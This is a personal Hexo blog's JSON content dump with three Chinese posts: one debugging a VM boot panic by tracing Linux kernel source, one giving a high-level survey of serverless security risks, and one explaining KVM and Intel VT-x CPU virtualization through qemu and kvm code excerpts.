{"meta":{"title":"s1eep123のblog","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2022-08-31T23:57:39.000Z","updated":"2022-08-31T23:58:38.167Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-09-01T00:00:19.000Z","updated":"2022-09-01T00:00:42.444Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2022-08-31T16:16:30.000Z","updated":"2022-09-01T01:42:06.275Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"1才华还撑不起你的野心时，我该怎么办"}],"posts":[{"title":"记一次虚拟机启动失败调试过程","slug":"虚拟机启动失败调试","date":"2023-07-19T14:52:44.777Z","updated":"2023-07-19T15:01:06.430Z","comments":true,"path":"2023/07/19/虚拟机启动失败调试/","link":"","permalink":"http://example.com/2023/07/19/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5%E8%B0%83%E8%AF%95/","excerpt":"","text":"记一次虚拟机启动失败调试过程实习过程中分配了个小任务，替换iso镜像中的sqfs文件并重新打包为iso。其中在测试iso是否打包成功过程中，要vmware发现无法启动报panic，具体输出如下图。后用centos7镜像做同样测试发现也会报错。深入centos7内核代码查看调试。最终发现是由于虚拟机配置初始化时默认硬盘空间太小导致无法挂载系统盘导致。 linux kernel源代码和iso镜像的关系梳理一下如何从linux kernel代码来制作iso的过程 下载kernel代码 修改配置文件 编译内核 安装内核 将文件系统打包为iso镜像 在安装好的系统下执行sudo cp -r &#x2F;boot iso 创建isolinux.cfg配置文件。之后使用mkisofs工具即可将文件系统打包为iso即完成 解压原本的iso文件可以看到一下目录，可以理解为iso是包含了系统的文件系统信息，如目录结构、文件属性和引导代码的一个压缩文件 虚拟机启动panic过程 其中能想到调试方法有两种，一种是通过qemu模拟虚拟机+外部串口链接通过kgdb进行调试。但此方法需要对linux代码添加相关调试信息且需要重新编译源码，较为麻烦。 因此通过一种报错字符串定位内核代码向上回朔调用栈来进行debug 下载该linux发行版对应内核版本，根据屏幕显示的debug信息全局搜索Decomporessing Linux…关键字定位具体函数。（linux内核中包含了不同架构实现的代码，由于centos7使用的是x86架构。因此后续分析如不说明皆为x86下） 123456789101112131415161718192021222324252627282930313233343536373839//Users/s1eep/kernel/linux/arch/x86/boot/compressed/misc.casmlinkage void decompress_kernel(void *rmode, memptr heap, unsigned char *input_data, unsigned long input_len, unsigned char *output)&#123; // 设置os模式为实模式并且memset相关内存 real_mode = rmode; sanitize_boot_params(real_mode); //初始化控制台打印信息相关设置，如设置字符输出端口，具体输出到屏幕的那个像素，颜色等 if (real_mode-&gt;screen_info.orig_video_mode == 7) &#123; vidmem = (char *) 0xb0000; vidport = 0x3b4; &#125; else &#123; vidmem = (char *) 0xb8000; vidport = 0x3d4; &#125; lines = real_mode-&gt;screen_info.orig_video_lines; cols = real_mode-&gt;screen_info.orig_video_cols; console_init(); //在/x86/boot/compressed/misc.c/ __putstr(const char *s) 中可看到字符输出的屏幕的具体实现 debug_putstr(&quot;early console in decompress_kernel\\n&quot;); //分配的空闲内存，至于为什么是堆，因为栈空间还未分配 free_mem_ptr = heap; /* Heap */ free_mem_end_ptr = heap + BOOT_HEAP_SIZE; ...内存区间是否越界相关判断 //接下来就是kernel启动过程中看到的字符串 debug_putstr(&quot;\\nDecompressing Linux... &quot;); decompress(input_data, input_len, NULL, NULL, output, NULL, error); parse_elf(output); debug_putstr(&quot;done.\\nBooting the kernel.\\n&quot;); return;&#125; 分析函数看到 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197//linux/boot/head.S .code32 .text#include &lt;linux/init.h&gt;#include &lt;linux/linkage.h&gt;#include &lt;asm/segment.h&gt;#include &lt;asm/pgtable_types.h&gt;#include &lt;asm/page_types.h&gt;#include &lt;asm/boot.h&gt;#include &lt;asm/msr.h&gt;#include &lt;asm/processor-flags.h&gt;#include &lt;asm/asm-offsets.h&gt;//删除32位处理逻辑，只关注64位 .code64 .org 0x200ENTRY(startup_64)#ifdef CONFIG_EFI_STUB jmp preferred_addrENTRY(efi_pe_entry) mov %rcx, %rdi mov %rdx, %rsi pushq %rdi pushq %rsi call make_boot_params cmpq $0,%rax je 1f mov %rax, %rdx popq %rsi popq %rdiENTRY(efi_stub_entry) call efi_main movq %rax,%rsi cmpq $0,%rax jne 2f1: /* EFI init failed, so hang. */ hlt jmp 1b2: call 3f3: popq %rax subq $3b, %rax subq BP_pref_address(%rsi), %rax add BP_code32_start(%esi), %eax leaq preferred_addr(%rax), %rax jmp *%raxpreferred_addr:#endif //段寄存器清零 xorl %eax, %eax movl %eax, %ds movl %eax, %es movl %eax, %ss movl %eax, %fs movl %eax, %gs /* * 如果kernel是可重定向的，则从2MB addr 对齐的加载地址解压并运行内核， * 否则从 LOAD_PHYSICAL_ADDR 解压并运行内核 */#ifdef CONFIG_RELOCATABLE leaq startup_32(%rip) /* - $startup_32 */, %rbp movl BP_kernel_alignment(%rsi), %eax decl %eax addq %rax, %rbp notq %rax andq %rax, %rbp#else movq $LOAD_PHYSICAL_ADDR, %rbp#endif /* * 读取 boot_params.init_size ，得到 kernel initialization size * 减去 _end ，得到起始地址，再加上实际的起始偏移量，得到： * 内核重定位后的起始地址，保存到 rbx */ leaq z_extract_offset(%rbp), %rbx /* Set up the stack */ leaq boot_stack_end(%rbx), %rsp /* Zero EFLAGS */ pushq $0 popfq/* * Copy the compressed kernel to the end of our buffer * where decompression in place becomes safe. */ pushq %rsi leaq (_bss-8)(%rip), %rsi leaq (_bss-8)(%rbx), %rdi movq $_bss /* - $startup_32 */, %rcx shrq $3, %rcx std rep movsq cld popq %rsi/* * Jump to the relocated address. */ leaq relocated(%rbx), %rax jmp *%rax .textrelocated:/* * Clear BSS (stack is currently empty) */ xorl %eax, %eax leaq _bss(%rip), %rdi leaq _ebss(%rip), %rcx subq %rdi, %rcx shrq $3, %rcx rep stosq/* * Adjust our own GOT */ leaq _got(%rip), %rdx leaq _egot(%rip), %rcx1: cmpq %rcx, %rdx jae 2f addq %rbx, (%rdx) addq $8, %rdx jmp 1b2: /* * Do the decompression, and jump to the new kernel.. */ pushq %rsi /* Save the real mode argument */ movq %rsi, %rdi /* real mode address */ leaq boot_heap(%rip), %rsi /* malloc area for uncompression */ leaq input_data(%rip), %rdx /* input_data */ movl $z_input_len, %ecx /* input_len */ movq %rbp, %r8 /* output target address */ //调用函数 call decompress_kernel popq %rsi/* * Jump to the decompressed kernel. */ jmp *%rbp .code32no_longmode: /* This isn&#x27;t an x86-64 CPU so hang */1: hlt jmp 1b#include &quot;../../kernel/verify_cpu.S&quot; .datagdt: .word gdt_end - gdt .long gdt .word 0 .quad 0x0000000000000000 /* NULL descriptor */ .quad 0x00af9a000000ffff /* __KERNEL_CS */ .quad 0x00cf92000000ffff /* __KERNEL_DS */ .quad 0x0080890000000000 /* TS descriptor */ .quad 0x0000000000000000 /* TS continued */gdt_end:/* * Stack and heap for uncompression */ .bss .balign 4boot_heap: .fill BOOT_HEAP_SIZE, 1, 0boot_stack: .fill BOOT_STACK_SIZE, 1, 0boot_stack_end:/* * Space for page tables (not in .bss so not zeroed) */ .section &quot;.pgtable&quot;,&quot;a&quot;,@nobits .balign 4096pgtable: .fill 6*4096, 1, 0 接着启动虚拟机报错信息在内核代码中向上朔源 &#x2F;initrd.image: incomplete write (-28!&#x3D;xxxx) 找到一下函数 1234567891011121314///Users/s1eep/kernel/linux/init/do_mounts_rd.ctatic int __init compr_flush(void *window, unsigned int outcnt)&#123; int written = sys_write(crd_outfd, window, outcnt); if (written != outcnt) &#123; if (decompress_error == 0) printk(KERN_ERR &quot;RAMDISK: incomplete write (%d != %d)\\n&quot;, written, outcnt); decompress_error = 1; return -1; &#125; return outcnt;&#125; 向上查看函数调用链 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193/Users/s1eep/kernel/linux/init/do_mounts_rd.cstatic int __init crd_load(int in_fd, int out_fd, decompress_fn deco)/Users/s1eep/kernel/linux/init/do_mounts_rd.cint __init rd_load_image(char *from)/Users/s1eep/kernel/linux/init/do_mounts_initrd.cint __init initrd_load(void)/Users/s1eep/kernel/linux/init/do_mounts.cvoid __init prepare_namespace(void)/Users/s1eep/kernel/linux/init/main.cstatic noinline void __init kernel_init_freeable(void)/Users/s1eep/kernel/linux/init/main.cstatic int __ref kernel_init(void *unused)/Users/s1eep/kernel/linux/init/main.cstatic noinline void __init_refok rest_init(void)asmlinkage void __init start_kernel(void)asmlinkage void __init start_kernel(void)&#123; char * command_line; extern const struct kernel_param __start___param[], __stop___param[]; /* * Need to run as early as possible, to initialize the * lockdep hash: */ lockdep_init(); smp_setup_processor_id(); debug_objects_early_init(); /* * Set up the the initial canary ASAP: */ boot_init_stack_canary(); cgroup_init_early(); local_irq_disable(); early_boot_irqs_disabled = true;/* * Interrupts are still disabled. Do necessary setups, then * enable them */ boot_cpu_init(); page_address_init(); pr_notice(&quot;%s&quot;, linux_banner); setup_arch(&amp;command_line); mm_init_owner(&amp;init_mm, &amp;init_task); mm_init_cpumask(&amp;init_mm); setup_command_line(command_line); setup_nr_cpu_ids(); setup_per_cpu_areas(); smp_prepare_boot_cpu(); /* arch-specific boot-cpu hooks */ build_all_zonelists(NULL, NULL); page_alloc_init(); pr_notice(&quot;Kernel command line: %s\\n&quot;, boot_command_line); parse_early_param(); parse_args(&quot;Booting kernel&quot;, static_command_line, __start___param, __stop___param - __start___param, -1, -1, &amp;unknown_bootoption); jump_label_init(); /* * These use large bootmem allocations and must precede * kmem_cache_init() */ setup_log_buf(0); pidhash_init(); vfs_caches_init_early(); sort_main_extable(); trap_init(); mm_init(); /* * Set up the scheduler prior starting any interrupts (such as the * timer interrupt). Full topology setup happens at smp_init() * time - but meanwhile we still have a functioning scheduler. */ sched_init(); /* * Disable preemption - early bootup scheduling is extremely * fragile until we cpu_idle() for the first time. */ preempt_disable(); if (WARN(!irqs_disabled(), &quot;Interrupts were enabled *very* early, fixing it\\n&quot;)) local_irq_disable(); idr_init_cache(); perf_event_init(); rcu_init(); tick_nohz_init(); radix_tree_init(); /* init some links before init_ISA_irqs() */ early_irq_init(); init_IRQ(); tick_init(); init_timers(); hrtimers_init(); softirq_init(); timekeeping_init(); time_init(); profile_init(); call_function_init(); WARN(!irqs_disabled(), &quot;Interrupts were enabled early\\n&quot;); early_boot_irqs_disabled = false; local_irq_enable(); kmem_cache_init_late(); /* * HACK ALERT! This is early. We&#x27;re enabling the console before * we&#x27;ve done PCI setups etc, and console_init() must be aware of * this. But we do want output early, in case something goes wrong. */ console_init(); if (panic_later) panic(panic_later, panic_param); lockdep_info(); /* * Need to run this when irqs are enabled, because it wants * to self-test [hard/soft]-irqs on/off lock inversion bugs * too: */ locking_selftest();#ifdef CONFIG_BLK_DEV_INITRD if (initrd_start &amp;&amp; !initrd_below_start_ok &amp;&amp; page_to_pfn(virt_to_page((void *)initrd_start)) &lt; min_low_pfn) &#123; pr_crit(&quot;initrd overwritten (0x%08lx &lt; 0x%08lx) - disabling it.\\n&quot;, page_to_pfn(virt_to_page((void *)initrd_start)), min_low_pfn); initrd_start = 0; &#125;#endif page_cgroup_init(); debug_objects_mem_init(); kmemleak_init(); setup_per_cpu_pageset(); numa_policy_init(); if (late_time_init) late_time_init(); sched_clock_init(); calibrate_delay(); pidmap_init(); anon_vma_init();#ifdef CONFIG_X86 if (efi_enabled(EFI_RUNTIME_SERVICES)) efi_enter_virtual_mode();#endif thread_info_cache_init(); cred_init(); fork_init(totalram_pages); proc_caches_init(); buffer_init(); key_init(); security_init(); dbg_late_init(); vfs_caches_init(totalram_pages); signals_init(); /* rootfs populating might need page-writeback */ page_writeback_init();#ifdef CONFIG_PROC_FS proc_root_init();#endif cgroup_init(); cpuset_init(); taskstats_init_early(); delayacct_init(); check_bugs(); acpi_early_init(); /* before LAPIC and SMP init */ sfi_init_late(); if (efi_enabled(EFI_RUNTIME_SERVICES)) &#123; efi_late_init(); efi_free_boot_services(); &#125; ftrace_init(); /* Do the rest non-__init&#x27;ed, we&#x27;re now alive */ rest_init();&#125; 分析第二行报错信息 Assuming drive cache: write through 12345678910defaults: if (sdp-&gt;wce_default_on) &#123; sd_printk(KERN_NOTICE, sdkp, &quot;Assuming drive cache: write back\\n&quot;); sdkp-&gt;WCE = 1; &#125; else &#123; sd_printk(KERN_ERR, sdkp, &quot;Assuming drive cache: write through\\n&quot;); sdkp-&gt;WCE = 0; &#125; sdkp-&gt;RCD = 0; sdkp-&gt;DPOFUA = 0; 分析第三行报错信息， VFS: Unable to mount root fs on unknown-block 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061///Users/s1eep/kernel/linux/init/do_mounts.cvoid __init mount_block_root(char *name, int flags)&#123; struct page *page = alloc_page(GFP_KERNEL | __GFP_NOTRACK_FALSE_POSITIVE); char *fs_names = page_address(page); char *p;#ifdef CONFIG_BLOCK char b[BDEVNAME_SIZE];#else const char *b = name;#endif get_fs_names(fs_names);retry: for (p = fs_names; *p; p += strlen(p)+1) &#123; int err = do_mount_root(name, p, flags, root_mount_data); switch (err) &#123; case 0: goto out; case -EACCES: flags |= MS_RDONLY; goto retry; case -EINVAL: continue; &#125; /* * Allow the user to distinguish between failed sys_open * and bad superblock on root device. * and give them a list of the available devices */#ifdef CONFIG_BLOCK __bdevname(ROOT_DEV, b);#endif printk(&quot;VFS: Cannot open root device \\&quot;%s\\&quot; or %s: error %d\\n&quot;, root_device_name, b, err); printk(&quot;Please append a correct \\&quot;root=\\&quot; boot option; here are the available partitions:\\n&quot;); printk_all_partitions();#ifdef CONFIG_DEBUG_BLOCK_EXT_DEVT printk(&quot;DEBUG_BLOCK_EXT_DEVT is enabled, you need to specify &quot; &quot;explicit textual name for \\&quot;root=\\&quot; boot option.\\n&quot;);#endif panic(&quot;VFS: Unable to mount root fs on %s&quot;, b); &#125; printk(&quot;List of all partitions:\\n&quot;); printk_all_partitions(); printk(&quot;No filesystem could mount root, tried: &quot;); for (p = fs_names; *p; p += strlen(p)+1) printk(&quot; %s&quot;, p); printk(&quot;\\n&quot;);#ifdef CONFIG_BLOCK __bdevname(ROOT_DEV, b);#endif panic(&quot;VFS: Unable to mount root fs on %s&quot;, b);out: put_page(page);&#125;","categories":[{"name":"内核","slug":"内核","permalink":"http://example.com/categories/%E5%86%85%E6%A0%B8/"},{"name":"虚拟化","slug":"内核/虚拟化","permalink":"http://example.com/categories/%E5%86%85%E6%A0%B8/%E8%99%9A%E6%8B%9F%E5%8C%96/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://example.com/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"}]},{"title":"Serverless及其安全风险","slug":"serverless","date":"2023-07-19T14:52:06.714Z","updated":"2023-07-19T15:03:47.531Z","comments":true,"path":"2023/07/19/serverless/","link":"","permalink":"http://example.com/2023/07/19/serverless/","excerpt":"","text":"这篇文章是对学习云原生及实习中做的一些工作的阶段性总结。 何为Iaas，Paas，Saas,引用知乎的一个高赞回答，可以理解为iaas作为云服务的第一个阶段，由云计算厂商统筹管理硬件资源，由客户来进行使用。用户需购买服务器并自己安装软件配置环境上传代码等开发运维工作 而PaaS由云厂商封装好应用的环境变量等配置信息由用户上传代码使用即可，这种和容器有异曲同工之处。SaaS即厂商软件也给你封装好，直接进行使用即可。 而serverless提供了一种更简洁更方便的云服务方式，无服务器即用户不需要再像往常一样考虑服务器方面的问题，比如服务器的维护，漏洞更新，网络带宽，缩扩容，软件环境配置等。而是提供了FaaS（Function as a Service）函数即服务，Baas（Backend as a Service）后端即服务的概念。实现各类 Web 框架快速创建、迁移上云，可以实现Express、Next.js、Python Flask、PHP Laravel、Koa、Egg.js、Nuxt.js等框架应用的快速部署（从腾讯云官网可以看到）。 FaaS本质上是一种事件驱动并由消息触发的服务，事件类型可以是一个HTTP请求，也可以是一次用户操作，函数可以看作是完成某个功能或任务的代码片段。相比传统应用运行模式，Serverless业务代码被拆分成了函数粒度，不同函数表示不同的功能，函数之间调用关系也更加复杂。以下是腾讯云提供的函数服务 可以看到Faas类似于云api的功能，用户只需调用api接口即可实现相关服务。 BaaS可以理解为是一个整合和开放各种在应用开发中需要的服务能力的平台，它通过创建大量重复的代码功能，方便应用基于服务的快速开发和构建。这里的后端，指的就是各种云产品和云服务，例如对象存储COS，消息队列CMQ，云数据库CDB、TDSQL，云缓存CRedis等。这些产品或服务，用户直接开通即可使用。 serverless的安全风险 由于后端及基础设施是由云厂商进行维护的。对于云厂商来说，首先需要保障云基础环境安全，包括所有的底层基础设施和后端服务软件的安全性。同时云厂商也担负着Serverless平台应用整体安全防护责任，借助API网关、云防护等优势来保障Serverless应用安全。对于用户来说，需要保证上传到服务端的代码是安全的、同时确保应用策略配置安全，避免代码中存在漏洞或策略配置不当导致安全风险。所以从本质上来说，Serverless的安全性是需要云厂商和用户双方共同承担的 对于用户方面，SQL注入，XSS，命令执行等传统攻击方式在serverless中依旧存在，因此更多关注云厂商所需的安全工作 拒绝钱包攻击 DoW（Denial of Wallet,拒绝钱包攻击）是针对云平台账户的DoS方式，其目的是通过高并发来耗尽用户账户可用余额。DoW攻击与传统拒绝服务(DoS)攻击方式类似，恶意攻击者向通过构造大量并发请求来触发函数调用，由于Serverless是按照资源使用量和函数调用次数来收费的，当有大量调用产生时，服务会自动扩展，这将导致用户账户可用余额快速被消耗。DoW攻击的一个典型的场景是在用户订阅web程序上生成大量虚假用户，通过大量用户访问API端点造成大量资源消耗导致账户金额耗尽。 资源滥用风险 近年来，随着Severless的快速发展，各种服务滥用现象也相继出现，主要体现在云函数滥用和Serverless基础设施滥用。云函数常被恶意人员用作构建代理池、隐藏C2和构建webshell，恶意人员通过构建此类应用来达到隐藏其客户端真实IP的目的。Serverless应用也常被用于构建扫描、钓鱼等攻击平台，攻击者通过构建此类应用来实现对外部系统的扫描探测、钓鱼窃取用户数据等目的。这些滥用行为导致云基础设施资源被恶意利用和消耗，给云服务的正常使用和监测带来了极大的困扰。 第三方API和组件不安全接入 由于Serverless服务一般会接入多个云服务组件，包括云API、API网关、事件触发器等。若云服务或组件在接入Serverless服务时未对组件身份或接收数据进行校验，则可能导致安全风险的发生。接入数据源的增加会导致攻击面扩大，传统应用只能从单一服务器上获取敏感数据，而Serverless应用通常会接入大量数据源，若攻击者针对各数据源进行攻击，则可能获取到大量敏感数据。 运行时安全风险 若攻击者已经通过某种方式获得了Serverless服务器权限后，则可能通过替换引导程序的方式攻击Serverless应用服务，从而导致Serverless应用实例被接管。如果攻击者可以修改Serverless ACL策略，则可以通过修改函数超时时间，增加服务冷启动时间，或者通过Serverless预热插件增加运行时时长等方式实现持久化控制。 日志和监控不足 传统的应用已经有比较成熟的日志管理和分析工具，而Serverless函数级别的日志分析工具还未被广泛采用。由于Serverless应用函数数量多、生命周期短，各函数间调用关系复杂，因此任何一个点都可能成为攻击突破口。对于云厂商来说，需要具备完备的安全防护和应用监测体系，才能更好的保障Serverless应用和服务的安全。 云环境网络攻击风险 攻击者可利用漏洞或错误的云平台架构配置，从公有云环境横向移动到云管理内部网络(如公有云到IDC网络)；或者从公有云网络横向移动到客户构建的网络环境中，导致严重的攻击事件产生。","categories":[{"name":"虚拟化","slug":"虚拟化","permalink":"http://example.com/categories/%E8%99%9A%E6%8B%9F%E5%8C%96/"}],"tags":[{"name":"虚拟化","slug":"虚拟化","permalink":"http://example.com/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"}]},{"title":"KVM架构原理-CPU虚拟化","slug":"kvm架构原理-cpu虚拟化","date":"2023-07-01T08:40:44.100Z","updated":"2023-07-01T08:48:22.505Z","comments":true,"path":"2023/07/01/kvm架构原理-cpu虚拟化/","link":"","permalink":"http://example.com/2023/07/01/kvm%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-cpu%E8%99%9A%E6%8B%9F%E5%8C%96/","excerpt":"","text":"KVM架构原理-CPU虚拟化目前多数云厂商云服务器是采用xen和kvm进行虚拟化实现。且由于kvm的性能可以和pv媲美，天生支持硬件虚拟化，且在linux2.6.20被合并到linux kernel主流分支，维护成本较低等原因，所以大部分都是由kvm实现的。 学习kvm需理解基本术语如下： KVM：Kernel-based Virtual Machine 基于Linux内核的虚拟机，位于ring 0 VMM: Virtual Machine Monitor 虚拟机监控层，也就是KVM的内核模块 VM: Virtual Machine 由VMM创建的虚拟化硬件平台 Guest OS： 运行在VM上的操作系统 Host OS： 运行在物理硬件上的操作系统 虚拟化漏洞：在降低特权级的情况下，部分敏感指令仍无法被VMM截获 全虚拟化：Guest OS无需作任何修改即可在VM上运行. 半虚拟化：需要修改系统内核才能实现虚拟化，相比全虚拟化麻烦 何为虚拟化：在以前硬件不支持虚拟化时，需通过软件模拟来实现虚拟化，通过软件仿真出每一条cpu指令后执行，缺点是效率极低以及只能仿真自身硬件支持的指令（如intel芯片不能仿真amd芯片指令）。 另外在纯软件实现过程中，host os（可以看作位于ring 1）执行敏感指令时，vmm层（位于ring 0）可以捕获大部分敏感指令。而由于虚拟化漏洞存在，采用二进制翻译技术来解决，即通过将敏感指令翻译成二进制形式执行。但这也较为麻烦，因此芯片厂商如intel，amd等提供支持虚拟化的硬件来支持，如Intel virtualization Technology(Intel VT)和AMD的 AMD virtualization(AMD V)。下边主要讲解intel vt技术（关于vt技术之前了解过可实现某种调试器来过某些游戏检测，做一些游戏辅助，感兴趣可以了解了解） ——软件虚拟化结构图如下——- intel硬件虚拟化VT_X技术传统的IA-32架构下，linux有两种状态模式，即用户模式和内核模式，虚拟化VT-x技术将传统的IA-32进行扩展，引入两种用于虚拟化的操作模式，根模式（VMX root operatiomn）和非根模式（VMX non-root operation）。这两种模式统称为vmx模式。根模式和非根模式都有四个特权级（ring0-ring3）与传统os类似，但根模式下运行的一般是kvm内核模块以及宿主机，非根模式下运行的则是虚拟机，通过这种机制，来进行状态隔离（隔离host&#x2F;guest）以及状态转换（从host切换到guest，这种状态保存切换思想在linux内核中比比皆是，如从用户态切换到内核态，进线程切换，系统调用实现过程）。 host机和guest机具体运行模式如下： VMM(KVM内核模块)运行在根模式的Ring0 宿主机上的用户态应用程序运行于根模式的Ring3 虚拟机上的 OS Kernel 运行于非根模式的Ring0 虚拟机上的用户态应用程序运行于非根模式的Ring3 正如上文谈到的状态切换，类比于系统调用时从用户态切换至内核态使用栈来进行当前状态信息的保存和恢复。在vmx也提供了vmcs(Virtual-Machine Control Structure) 结构，来进行从host到guest上下文切换时保存状态信息，vt-x提供VM_ENTRY和VM_EXIT来进行两种状态切换，在发生VM-Exit时，硬件自动保存当前的上下文环境到VMCS的客户机状态域中，同时从VMCS的宿主机状态域中加载信息到CPU中；在发生VM-Entry时，CPU自动从VMCS的客户机状态域中加载信息CPU中（注意并不保存宿主机状态，因为每次都是相同的）。这样就实现了由硬件完成状态的切换。 VMCS结构VMCS是保存在内存中一个数据结构，大小不超过4K，申请内存时，起始地址须对齐到4K边界上，每个VMCS对应到一个虚拟CPU，在使用时需要与物理CPU绑定，在任意时刻，一个VMCS只能与一个物理CPU形成一对一的绑定关系，VT-x技术提供了两条指令来执行VMCS的绑定与解绑定： VMPTRLD &lt;VMCS地址&gt;: 将指定地址的VMCS与执行该指令的物理进行CPU绑定。 VMCLEAR : 用于解除VMCS与物理CPU建立的绑定关系。 VM_CS结构通常保存以下信息 客户机状态域 客户机环境时的上下文信息，寄存器等 宿主机状态域 VM-Entry控制域 控制VM-Entry的过程，如确定需要加载的MSR寄存器、根据相关标志位判断是否进入虚拟机等 VM-Execution控制域 VM-Exit控制域 VM-Exit信息域 KVM原理架构KVM已在linux内核中被集成，可在linux virt模块下看到相关的源代码。kvm是由一个运行在用户空间的Qemu-kvm进程和两个内核模块 (kvm.ko kvm-intel.ko) 组成，内核模块在加载过程中注册一个字符设备&#x2F;dev&#x2F;kvm，并向上层应用程序提供API接口，Qemu-kvm进程通过该字符设备提供的ioctl系统调用向内核请求服务，如创建虚拟机、创建VCPU、启动VCPU的运行等；从功能层面划分，内核模块负责创建虚拟机，完成CPU的虚拟化和内存的虚拟化，而Qemu-kvm进程负责I&#x2F;O设备、虚拟LAPIC的模拟等； 虚拟机的运行流程 运行在用户态的Qemu-kvm通过ioctl系统调用操作&#x2F;dev&#x2F;kvm字符设备，开始创建VM和VCPU； 内核KVM模块创建相关数据结构并初始化，然后返回文件描述到用户态； Qemu-kvm通过ioctl系统调用运行VCPU，即调度相应的VM运行； 内核进行相关处理后，执行VMLAUNCH指令，通过VM-Entry进入Guest OS运行，Guest OS运行于非根模式下； Guest OS执行相应的虚拟机代码，非敏感指令可直接在物理CPU上运行； 当Guest OS中执行到敏感指令、发生外部中断、或Guest OS发生内部异常时，将产生VM-Exit，并将相关信息记录到VMCS结构中； VM-Exit返回到VMM执行环境下，VMM从VMCS结构中读取VM-Exit的原因； 如是I&#x2F;O操作或是其他外设指令，则返回到用户态Qemu-kvm(即根模式下的Ring3)，由Qemu-kvm完成对相关指令的模拟； 如果不是，则由VMM自行处理； 处理完成后，重新VM-entry进入到Guest OS运行。 qemu-kvm源码分析虚拟机创建及cpu虚拟化启动虚拟机后，查看进程可见存在用户态qemu-kvm 虚拟机创建由用户态的qemu-kvm启动进程和内核的kvm模块（kvm.ko&amp;kvm-intel.ko）共同完成。内核模块加载过程中注册字符设备&#x2F;dev&#x2F;kvm，之后由用户态进程执行ioctl系统调用操作字符设备，接下来内核模块负责创建相关数据结构以及fd，并返回给用户空间。 下面从qemu&#x2F;kvm源码来分析相关流程，首先是是创建虚拟机用户态的qemu-kvm进程 （以下代码qemu版本 &#x3D;5.1.0 ，kvm版本 &#x3D; 3.4.x） 123456789101112131415161718192021222324int kvm_init(QEMUMachine *machine)&#123; KVMState *s; s-&gt;vmfd = -1; s-&gt;fd = qemu_open(&quot;/dev/kvm&quot;, O_RDWR); //打开一个/dev/kvm字符设备 ret = kvm_ioctl(s, KVM_GET_API_VERSION, 0); ret = kvm_ioctl(s, KVM_CREATE_VM, type); // 通过ioctl系统调用创建vm ret = kvm_arch_init(s); ret = kvm_irqchip_create(s); memory_listener_register(&amp;kvm_memory_listener, &amp;address_space_memory); memory_listener_register(&amp;kvm_io_listener, &amp;address_space_io); s-&gt;many_ioeventfds = kvm_check_many_ioeventfds(); cpu_interrupt_handler = kvm_handle_interrupt;&#125;int kvm_ioctl(KVMState *s, int type, ...)&#123; //此函数是对ioctl系统调用的检查和封装 trace_kvm_ioctl(type, arg); ret = ioctl(s-&gt;fd, type, arg);&#125; 通过系统调用KVM_CREATE_VM创建虚拟机,跳转至kvm查看 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778static long kvm_dev_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)&#123; case KVM_CREATE_VM: r = kvm_dev_ioctl_create_vm(arg); break;&#125;static int kvm_dev_ioctl_create_vm(unsigned long type)&#123; struct kvm *kvm; kvm = kvm_create_vm(type); file = anon_inode_getfile(&quot;kvm-vm&quot;, &amp;kvm_vm_fops, kvm, O_RDWR);&#125;创建kvm结构体，一个虚拟机就对应一个kvm结构体，包含内存、中断、vcpu、I/O总线等信息。对虚拟机的操作就是对这个结构体进行操作。下面来看看kvm结构体部分重要成员struct kvm &#123; rwlock_t mmu_lock; spinlock_t mmu_lock; struct mutex slots_lock; /* * Protects the kvm_memory_slots */ struct mutex slots_arch_lock; struct mm_struct *mm; //用户进程的地址空间 unsigned long nr_memslot_pages; /* The two memslot sets - active and inactive (per address space) */ //guest gpa（客户机物理地址）和host hva（宿主机虚拟地址）映射关系 struct kvm_memslots __memslots[KVM_ADDRESS_SPACE_NUM][2]; /* The current active memslot set for each address space */ struct kvm_memslots __rcu *memslots[KVM_ADDRESS_SPACE_NUM]; //虚拟机创建的所有vcpu数组 struct xarray vcpu_array; /* * Protected by slots_lock, but can be read outside if an * incorrect answer is acceptable. */ atomic_t nr_memslots_dirty_logging; /* Used to wait for completion of MMU notifiers. */ spinlock_t mn_invalidate_lock; unsigned long mn_active_invalidate_count; struct rcuwait mn_memslots_update_rcuwait; /* For management / invalidation of gfn_to_pfn_caches */ spinlock_t gpc_lock; struct list_head gpc_list; //创建的虚拟机添加到双向链表，便利链表即可遍历虚拟机 struct list_head vm_list; struct mutex lock; //虚拟机中的io总线数组 struct kvm_io_bus __rcu *buses[KVM_NR_BUSES]; struct &#123; spinlock_t lock; struct list_head items; /* resampler_list update side is protected by resampler_lock. */ struct list_head resampler_list; struct mutex resampler_lock; &#125; irqfds; struct list_head ioeventfds; //虚拟机的运行状态信息，包括mmu，页表等。 struct kvm_vm_stat stat; //架构相关 struct kvm_arch arch; //对该kvm的引用数 refcount_t users_count;&#125;; 接下来看看kvm_create_vm()具体 12345678910111213141516171819202122232425262728293031323334353637383940414243//主要就是对kvm结构体初始化一些工作static struct kvm *kvm_create_vm(unsigned long type)&#123; struct kvm *kvm = kvm_arch_alloc_vm(); if (!kvm) return ERR_PTR(-ENOMEM); ... 